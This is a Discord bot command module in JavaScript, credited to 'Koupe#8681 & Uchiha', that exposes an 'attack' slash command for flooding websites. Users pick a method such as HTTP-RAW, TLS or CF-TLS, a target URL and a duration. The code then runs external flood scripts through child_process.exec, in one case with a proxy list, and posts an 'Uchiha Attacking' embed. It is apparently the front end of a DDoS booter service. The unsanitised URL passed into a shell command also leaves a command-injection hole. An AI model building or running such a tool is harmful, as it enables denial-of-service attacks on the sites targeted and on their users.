const Discord = require('discord.js');
const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require(`discord.js`);
const { SlashCommandBuilder } = require('@discordjs/builders');

const { MessageActionRow, MessageButton } = require('discord.js');
module.exports = {
  data: new SlashCommandBuilder()
  .setName("attack")
  .setDescription("Attacks Website")
  .addStringOption(option => 
  option.setName("method")
  .setDescription("Vui Lòng Chọn Methods ")
  .setRequired(true)
  .addChoices(
    {name: "🚀 | HTTP-RAW", value: "HTTP-RAW"},
    {name: "🚀 | TLS", value: "TLS"},
    {name: "🚀 | CFSockets", value: "CFSockets"},
    {name: "🚀 | CF-TLS", value: "CF-TLS"},
    {name: "🚀 | BROWSER", value: "BROWSER"},
    ))
    .addStringOption(option =>
    option.setName("target")
    .setDescription("Enter the website you want to attack") 
    .setRequired(true))
    .addStringOption(option =>
    option.setName("time")
    .setDescription("Time Attacks")
    .setRequired(true)),
    async execute(interaction, name) { 
      const url = interaction.options.getString("target");
      const mths = interaction.options.getString("method");
      const time = interaction.options.getString("time");
      if (mths === "HTTP-RAW") {
        console.log("HTTP-RAW ĐZ")
        var exec = require('child_process').exec 
        exec(`node HTTP-RAW.js ${url} ${time}`, (error, stdout, stderr) => {
        });
      }
      if (mths === "TLS") {
        console.log(`attack tls by ${interaction.user.username}`)
        var exec = require('child_process').exec 
        exec(`node TLS.js ${url} ${time}`, (error, stdout, stderr) => {
        });
}
      if (mths === "CFSockets") {
        console.log(`attack CFSockets by ${interaction.user.username}`)
        var exec = require('child_process').exec 
        exec(`node CFSockets ${url} ${time}`, (error, stdout, stderr) => {
        });
      }
      if (mths === "CF-TLS") {
        console.log(`attack cf-tls ${interaction.user.username}`)
        var exec = require('child_process').exec 
        exec(`node CF-TLS.js ${url} ${time} 150 proxy.txt`, (error, stdout, stderr) => {
        })
      }
      const newEmbed = new EmbedBuilder()
      .setColor('#FF0000') 
      .setTitle("Uchiha Attacking")
      .setTimestamp()
		  .setDescription(`тᴀʀԍᴇт: ${url}\nмᴇтнoᴅ: ${mths}\nтιмᴇ: ${time}`)
		  .setImage("https://images.squarespace-cdn.com/content/v1/574faff6f8baf35e5da43485/1495284929670-UWO1P40E52N649BBVSNS/rocket_3.gif")
		  .setFooter({ text: "© Developer: Koupe#8681 & Uchiha", iconURL: "https://cs14.pikabu.ru/post_img/2022/09/13/6/1663057343110579147.webp"})
		  .addFields(
		    
        {name: `**Attacking From ${interaction.user.username}**`, value: "Attack All Server"}
            );
            await interaction.reply({embeds: [newEmbed]})
    },
}
